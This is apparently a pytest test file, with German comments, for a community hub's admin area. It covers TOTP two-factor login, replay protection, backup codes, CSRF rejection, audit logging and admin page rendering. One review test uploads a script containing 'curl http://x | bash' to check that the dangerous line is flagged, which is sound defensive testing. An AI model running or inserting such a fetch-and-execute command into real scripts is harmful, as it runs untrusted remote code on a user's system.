"""Admin-Neubau (09/2026): zweiter Faktor, CSRF, Protokoll, Seiten, API-Policy.

Reine Tests (immer): TOTP gegen die RFC-6238-Vektoren, Replay-Schutz,
Backup-Codes, Verschlüsselung, CSRF-Vergleich.

DB-Tests (mit ``DATABASE_URL_TEST``): der komplette Anmelde-Ablauf ohne und
MIT zweitem Faktor, dass jede Aktion protokolliert wird, dass ein Formular
ohne CSRF-Token abgewiesen wird, dass die Basic-API bei aktivem 2FA schließt,
und dass alle Admin-Seiten mit Sitzung rendern.
"""

from __future__ import annotations

import base64
import re

import pytest

from app.auth import admin_security as sec
from tests.conftest import requires_db

ADMIN_USER = "admin"
ADMIN_PASS = "test-admin-pass"
_BASIC = "Basic " + base64.b64encode(f"{ADMIN_USER}:{ADMIN_PASS}".encode()).decode()
ADMIN_HEADER = {"X-Admin-Authorization": _BASIC}

# RFC 6238, Anhang B — SHA1, Geheimnis "12345678901234567890" (Base32 unten).
_RFC_SECRET = base64.b32encode(b"12345678901234567890").decode()
_RFC_VECTORS = [
    (59, "287082"),
    (1111111109, "081804"),
    (1234567890, "005924"),
    (2000000000, "279037"),
]


# ---- rein ---------------------------------------------------------------------------


@pytest.mark.parametrize(("at", "code"), _RFC_VECTORS)
def test_totp_matches_rfc6238_vectors(at, code):
    """8-stellige RFC-Werte enden auf unsere 6 Stellen — gleicher Algorithmus."""
    assert sec.totp_at(_RFC_SECRET, at=at) == code


def test_totp_accepts_neighbouring_step_but_not_two_away():
    secret = sec.generate_totp_secret()
    now = 1_700_000_000
    prev_code = sec.totp_at(secret, at=now - 30)
    far_code = sec.totp_at(secret, at=now - 90)
    assert sec.verify_totp(secret, prev_code, last_counter=None, at=now) is not None
    assert sec.verify_totp(secret, far_code, last_counter=None, at=now) is None


def test_totp_code_is_single_use_via_last_counter():
    """Derselbe Code darf innerhalb seiner 30 s nicht zweimal gelten (Replay)."""
    secret = sec.generate_totp_secret()
    now = 1_700_000_000
    code = sec.totp_at(secret, at=now)
    counter = sec.verify_totp(secret, code, last_counter=None, at=now)
    assert counter == sec.totp_counter(now)
    assert sec.verify_totp(secret, code, last_counter=counter, at=now) is None
    # Ein späterer Code geht wieder.
    later = sec.totp_at(secret, at=now + 30)
    assert sec.verify_totp(secret, later, last_counter=counter, at=now + 30) == counter + 1


def test_totp_rejects_garbage():
    secret = sec.generate_totp_secret()
    for bad in ("", "12345", "abcdef", "1234567", None):
        assert sec.verify_totp(secret, bad, last_counter=None) is None  # type: ignore[arg-type]


def test_backup_codes_are_consumed_once_and_case_insensitive():
    pepper = "pepper"
    codes = sec.generate_backup_codes()
    assert len(codes) == 10 and len(set(codes)) == 10
    hashes = [sec.hash_backup_code(c, pepper) for c in codes]
    remaining = sec.consume_backup_code(codes[3].upper().replace("-", " "), hashes, pepper)
    assert remaining is not None and len(remaining) == 9
    assert sec.consume_backup_code(codes[3], remaining, pepper) is None
    assert sec.consume_backup_code("nope-nope", remaining, pepper) is None
    assert sec.consume_backup_code("", remaining, pepper) is None


def test_secret_encryption_roundtrip_and_key_binding():
    token = sec.encrypt_secret("JBSWY3DPEHPK3PXP", "key-a")
    assert sec.decrypt_secret(token, "key-a") == "JBSWY3DPEHPK3PXP"
    with pytest.raises(Exception):  # noqa: B017 — AES-GCM: falscher Schlüssel = InvalidTag
        sec.decrypt_secret(token, "key-b")


def test_otpauth_uri_carries_issuer_and_secret():
    uri = sec.otpauth_uri("ABCDEFGH", account="lukas", issuer="Vesana Community Hub (x)")
    assert uri.startswith("otpauth://totp/")
    assert "secret=ABCDEFGH" in uri and "digits=6" in uri and "period=30" in uri
    assert "issuer=Vesana%20Community%20Hub%20%28x%29" in uri


def test_qr_svg_is_inline_svg_without_scripts():
    svg = str(sec.qr_svg("otpauth://totp/x?secret=ABC"))
    assert svg.startswith("<svg") and "<script" not in svg and 'class="qr"' in svg


def test_csrf_dependency_rejects_missing_and_wrong_token():
    from fastapi import HTTPException
    from starlette.requests import Request

    from app.auth.csrf import require_csrf

    scope = {"type": "http", "session": {"csrf": "right"}, "headers": []}
    request = Request(scope)
    with pytest.raises(HTTPException):
        require_csrf(request, csrf="")
    with pytest.raises(HTTPException):
        require_csrf(request, csrf="wrong")
    assert require_csrf(request, csrf="right") is None


def test_audit_record_rejects_unknown_action():
    from app.services.admin_audit import record

    with pytest.raises(ValueError):
        record(None, admin_user="a", action="nope.nope")  # type: ignore[arg-type]


# ---- Quell-Anker ----------------------------------------------------------------------


def _admin_templates():
    from pathlib import Path

    root = Path(__file__).resolve().parents[1] / "app" / "templates" / "admin"
    return sorted(root.glob("*.html"))


def test_every_admin_post_form_carries_the_csrf_field():
    """Ein Formular ohne Token wird vom Server abgewiesen — es wäre ein toter Knopf."""
    form_re = re.compile(r"<form\b[^>]*method=\"post\"[^>]*>(.*?)</form>", re.S | re.I)
    for path in _admin_templates():
        if path.name in ("login.html", "login_2fa.html"):
            continue  # vor der Anmeldung gibt es keine Sitzung, also keinen Token
        text = path.read_text(encoding="utf-8")
        for match in form_re.finditer(text):
            assert 'include "admin/_csrf.html"' in match.group(1), (
                f"{path.name}: {match.group(0)[:80]}"
            )


def test_admin_uses_no_browser_popups():
    from pathlib import Path

    js = (Path(__file__).resolve().parents[1] / "app" / "static" / "js" / "admin.js").read_text()
    assert "window.confirm" not in js and "alert(" not in js and "prompt(" not in js
    for path in _admin_templates():
        assert "onclick" not in path.read_text(encoding="utf-8")


def test_every_audit_action_has_a_label_in_both_languages():
    from app.i18n import TRANSLATIONS
    from app.services.admin_audit import ACTIONS, action_groups

    for lang in ("de", "en"):
        for action in ACTIONS:
            assert f"audit.{action}" in TRANSLATIONS[lang], (lang, action)
        for prefix, _ in action_groups():
            assert f"audit.group.{prefix}" in TRANSLATIONS[lang], (lang, prefix)


def test_admin_shell_has_no_leftover_legacy_classes():
    """Die alten C8-Klassen (admin-table, admin-btn …) sind weg — samt CSS."""
    from pathlib import Path

    for path in _admin_templates():
        text = path.read_text(encoding="utf-8")
        assert "admin-btn" not in text and "admin-table" not in text and "admin__nav" not in text
    css = (
        Path(__file__).resolve().parents[1] / "app" / "static" / "css" / "community.css"
    ).read_text()
    assert ".admin-table" not in css and ".admin-btn" not in css


def test_admin_css_never_hardcodes_white_text():
    from pathlib import Path

    css = (Path(__file__).resolve().parents[1] / "app" / "static" / "css" / "admin.css").read_text()
    css = re.sub(r"/\*.*?\*/", "", css, flags=re.S)
    assert re.search(r"color\s*:\s*(#fff\b|#ffffff\b|white\b)", css, re.I) is None


# ---- DB-Helfer -------------------------------------------------------------------------


def _login(client, password: str = ADMIN_PASS):
    return client.post(
        "/admin/login",
        data={"username": ADMIN_USER, "password": password},
        follow_redirects=False,
    )


def _csrf(client) -> str:
    html = client.get("/admin").text
    match = re.search(r'<meta name="csrf-token" content="([^"]+)"', html)
    assert match, "kein CSRF-Token im Kopf der Admin-Seite"
    return match.group(1)


def _api_token(client, make_login_jwt, sub: str, display_name: str) -> str:
    login = make_login_jwt(sub=sub, display_name=display_name)
    resp = client.post("/api/v1/auth/exchange", json={"token": login})
    assert resp.status_code == 200, resp.text
    return resp.json()["api_token"]


def _upload(client, token: str, name: str, scripts: list | None = None) -> str:
    bundle = {
        "schema_version": 1,
        "profile": {"name": name, "vendor": "ACME", "category": "server"},
        "checks": [{"name": "Ping", "check_type": "ping", "check_config": {"host": "1.1.1.1"}}],
    }
    if scripts:
        bundle["scripts"] = scripts
    resp = client.post(
        "/api/v1/profiles/upload",
        json={"bundle": bundle},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp.status_code == 200, resp.text
    return resp.json()["profile_id"]


def _enable_2fa(client) -> tuple[str, list[str]]:
    """Richtet 2FA über die Oberfläche ein; liefert (secret, backup_codes)."""
    token = _csrf(client)
    assert (
        client.post(
            "/admin/security/2fa/setup", data={"csrf": token}, follow_redirects=False
        ).status_code
        == 303
    )
    page = client.get("/admin/security/2fa/setup").text
    secret = re.search(r'data-copy="([A-Z2-7]{32})"', page).group(1)
    code = sec.totp_at(secret)
    resp = client.post("/admin/security/2fa/confirm", data={"csrf": token, "code": code})
    assert resp.status_code == 200, resp.text
    codes = re.findall(r'<li class="mono">([a-z2-9]{5}-[a-z2-9]{5})</li>', resp.text)
    assert len(codes) == 10
    return secret, codes


# ---- DB: Anmeldung --------------------------------------------------------------------


@requires_db
def test_login_without_2fa_sets_session_and_audit(db_app_client):
    c = db_app_client
    resp = _login(c)
    assert resp.status_code == 303 and resp.headers["location"] == "/admin"
    assert c.get("/admin").status_code == 200
    audit = c.get("/admin/audit").text
    assert "Nur Passwort" in audit or "Password only" in audit


@requires_db
def test_wrong_password_is_logged_and_rejected(db_app_client):
    c = db_app_client
    assert _login(c, "nope").status_code == 401
    assert c.get("/admin", follow_redirects=False).status_code == 303
    # Nach der echten Anmeldung steht der Fehlversuch im Protokoll.
    _login(c)
    assert ("Passwort falsch" in c.get("/admin/audit").text) or (
        "Wrong password" in c.get("/admin/audit").text
    )


@requires_db
def test_post_without_csrf_is_forbidden_even_with_session(db_app_client, make_login_jwt):
    c = db_app_client
    token = _api_token(c, make_login_jwt, "inst-x", "X")
    profile_id = _upload(c, token, "CSRF Target")
    _login(c)
    resp = c.post(f"/admin/review/{profile_id}/approve", data={}, follow_redirects=False)
    assert resp.status_code == 403
    resp = c.post(
        f"/admin/review/{profile_id}/approve", data={"csrf": "bogus"}, follow_redirects=False
    )
    assert resp.status_code == 403
    # Mit Token geht es — und es steht im Protokoll.
    resp = c.post(
        f"/admin/review/{profile_id}/approve", data={"csrf": _csrf(c)}, follow_redirects=False
    )
    assert resp.status_code == 303
    page = c.get(f"/admin/profiles/{profile_id}").text
    assert 'badge--approved">approved' in page


@requires_db
def test_2fa_setup_then_login_requires_code_and_rejects_replay(db_app_client):
    c = db_app_client
    _login(c)
    secret, codes = _enable_2fa(c)
    assert "badge--ok" in c.get("/admin/security").text

    # Neue Sitzung: Passwort allein reicht nicht mehr.
    c.cookies.clear()
    resp = _login(c)
    assert resp.status_code == 303 and resp.headers["location"] == "/admin/login/verify"
    assert c.get("/admin", follow_redirects=False).status_code == 303  # noch kein Admin

    code = sec.totp_at(secret)
    # Beim Einrichten wurde ein Zähler verbraucht — evtl. braucht es den nächsten Schritt.
    resp = c.post("/admin/login/verify", data={"code": code}, follow_redirects=False)
    if resp.status_code == 401:
        import time

        code = sec.totp_at(secret, at=time.time() + 30)
        resp = c.post("/admin/login/verify", data={"code": code}, follow_redirects=False)
    assert resp.status_code == 303 and resp.headers["location"] == "/admin"
    assert c.get("/admin").status_code == 200

    # Replay desselben Codes in einer neuen Sitzung: abgelehnt.
    c.cookies.clear()
    _login(c)
    assert (
        c.post("/admin/login/verify", data={"code": code}, follow_redirects=False).status_code
        == 401
    )

    # Backup-Code funktioniert genau einmal.
    assert (
        c.post("/admin/login/verify", data={"code": codes[0]}, follow_redirects=False).status_code
        == 303
    )
    assert c.get("/admin").status_code == 200
    c.cookies.clear()
    _login(c)
    assert (
        c.post("/admin/login/verify", data={"code": codes[0]}, follow_redirects=False).status_code
        == 401
    )


@requires_db
def test_2fa_closes_the_basic_header_api(db_app_client, make_login_jwt):
    """Benutzer+Passwort im X-Admin-Authorization-Header darf 2FA nie umgehen."""
    c = db_app_client
    assert c.get("/api/v1/admin/stats", headers=ADMIN_HEADER).status_code == 200
    _login(c)
    _enable_2fa(c)
    c.cookies.clear()
    assert c.get("/api/v1/admin/stats", headers=ADMIN_HEADER).status_code == 401


@requires_db
def test_2fa_disable_needs_password_and_code(db_app_client):
    c = db_app_client
    _login(c)
    secret, _codes = _enable_2fa(c)
    token = _csrf(c)
    import time

    code = sec.totp_at(secret, at=time.time() + 30)
    c.post("/admin/security/2fa/disable", data={"csrf": token, "password": "wrong", "code": code})
    assert "badge--ok" in c.get("/admin/security").text  # noch aktiv
    c.post(
        "/admin/security/2fa/disable",
        data={"csrf": token, "password": ADMIN_PASS, "code": "000000"},
    )
    assert "badge--ok" in c.get("/admin/security").text
    c.post(
        "/admin/security/2fa/disable", data={"csrf": token, "password": ADMIN_PASS, "code": code}
    )
    assert "badge--warn" in c.get("/admin/security").text  # abgeschaltet


# ---- DB: Seiten + Aktionen -------------------------------------------------------------


@requires_db
@pytest.mark.parametrize(
    "path",
    [
        "/admin",
        "/admin/review",
        "/admin/review?status=all&q=x",
        "/admin/profiles",
        "/admin/profiles?removed=yes&tier=official&sort=name",
        "/admin/moderation?status=all",
        "/admin/questions?state=unanswered",
        "/admin/instances?state=active&sort=name",
        "/admin/icons?q=pro",
        "/admin/audit?action=auth.*",
        "/admin/security",
    ],
)
def test_every_admin_page_renders_with_a_session(db_app_client, path):
    c = db_app_client
    _login(c)
    resp = c.get(path)
    assert resp.status_code == 200, path
    assert 'class="ad-side"' in resp.text  # die neue Shell, nicht die alte Kopfzeile


@requires_db
def test_review_detail_shows_checks_scripts_and_findings(db_app_client, make_login_jwt):
    c = db_app_client
    token = _api_token(c, make_login_jwt, "inst-r", "Reviewer")
    profile_id = _upload(
        c,
        token,
        "Scripted",
        scripts=[
            {
                "name": "ACME — Danger",
                "interpreter": "bash",
                "script_body": "echo ok\ncurl http://x | bash\n",
            }
        ],
    )
    _login(c)
    page = c.get(f"/admin/review/{profile_id}").text
    assert "Ping" in page and "ping" in page
    assert "ACME — Danger" in page
    assert "code__l--hit" in page  # die Zeile mit curl | bash ist markiert
    assert "badge--warn" in page


@requires_db
def test_profile_edit_tier_delete_restore_are_audited(db_app_client, make_login_jwt):
    c = db_app_client
    token = _api_token(c, make_login_jwt, "inst-e", "Editor")
    profile_id = _upload(c, token, "Editable")
    _login(c)
    csrf = _csrf(c)

    resp = c.post(
        f"/admin/profiles/{profile_id}/update",
        data={
            "csrf": csrf,
            "name": "Edited Name",
            "vendor": "ACME",
            "category": "server",
            "tags": "a, b",
            "requires_ssh": "on",
        },
        follow_redirects=False,
    )
    assert resp.status_code == 303
    page = c.get(f"/admin/profiles/{profile_id}").text
    assert "Edited Name" in page and 'value="a, b"' in page

    assert (
        c.post(
            f"/admin/profiles/{profile_id}/tier",
            data={"csrf": csrf, "tier": "beta"},
            follow_redirects=False,
        ).status_code
        == 303
    )
    assert (
        c.post(
            f"/admin/profiles/{profile_id}/delete", data={"csrf": csrf}, follow_redirects=False
        ).status_code
        == 303
    )
    assert (
        "/p/" not in c.get("/api/v1/profiles").text
        or "Edited Name" not in c.get("/api/v1/profiles").text
    )
    assert (
        c.post(
            f"/admin/profiles/{profile_id}/restore", data={"csrf": csrf}, follow_redirects=False
        ).status_code
        == 303
    )

    audit = c.get(f"/admin/profiles/{profile_id}?tab=history").text
    for label in (
        "Profil bearbeitet",
        "Stufe geändert",
        "Profil gelöscht",
        "Profil wiederhergestellt",
    ):
        assert label in audit, label


@requires_db
def test_instance_block_with_reason_and_unblock(db_app_client, make_login_jwt):
    c = db_app_client
    token = _api_token(c, make_login_jwt, "inst-b", "Blockee")
    _login(c)
    csrf = _csrf(c)
    resp = c.post(
        "/admin/instances/inst-b/block",
        data={"csrf": csrf, "blocked": "true", "reason": "spam"},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert (
        c.get("/api/v1/notifications", headers={"Authorization": f"Bearer {token}"}).status_code
        == 403
    )
    page = c.get("/admin/instances/inst-b").text
    assert "spam" in page and "blocked" in page
    c.post(
        "/admin/instances/inst-b/block",
        data={"csrf": csrf, "blocked": "false"},
        follow_redirects=False,
    )
    assert (
        c.get("/api/v1/notifications", headers={"Authorization": f"Bearer {token}"}).status_code
        == 200
    )


@requires_db
def test_moderation_remove_from_admin_page(db_app_client, make_login_jwt):
    c = db_app_client
    a = _api_token(c, make_login_jwt, "inst-a", "Alpha")
    b = _api_token(c, make_login_jwt, "inst-b", "Bravo")
    profile_id = _upload(c, a, "Mod Target")
    comment_id = c.post(
        f"/api/v1/profiles/{profile_id}/comments",
        json={"body_md": "bad"},
        headers={"Authorization": f"Bearer {a}"},
    ).json()["id"]
    c.post(
        f"/api/v1/comments/{comment_id}/report",
        json={"reason": "abuse"},
        headers={"Authorization": f"Bearer {b}"},
    )
    _login(c)
    page = c.get("/admin/moderation").text
    report_id = re.search(r"/admin/moderation/([0-9a-f-]{36})/resolve", page).group(1)
    assert "Bravo" in page and f"/p/{profile_id}?tab=comments" in page
    resp = c.post(
        f"/admin/moderation/{report_id}/resolve",
        data={"csrf": _csrf(c), "action": "remove"},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    thread = c.get(f"/api/v1/profiles/{profile_id}/comments").json()
    assert thread[0]["comment"]["body_md"] is None
    assert "Meldung: Ziel entfernt" in c.get("/admin/audit").text


@requires_db
def test_idle_session_expires(db_app_client, monkeypatch):
    c = db_app_client
    _login(c)
    assert c.get("/admin").status_code == 200
    import time as _time

    real = _time.time
    monkeypatch.setattr("app.auth.deps.time.time", lambda: real() + 9 * 3600)
    resp = c.get("/admin/profiles", follow_redirects=False)
    assert resp.status_code == 303 and "reason=expired" in resp.headers["location"]
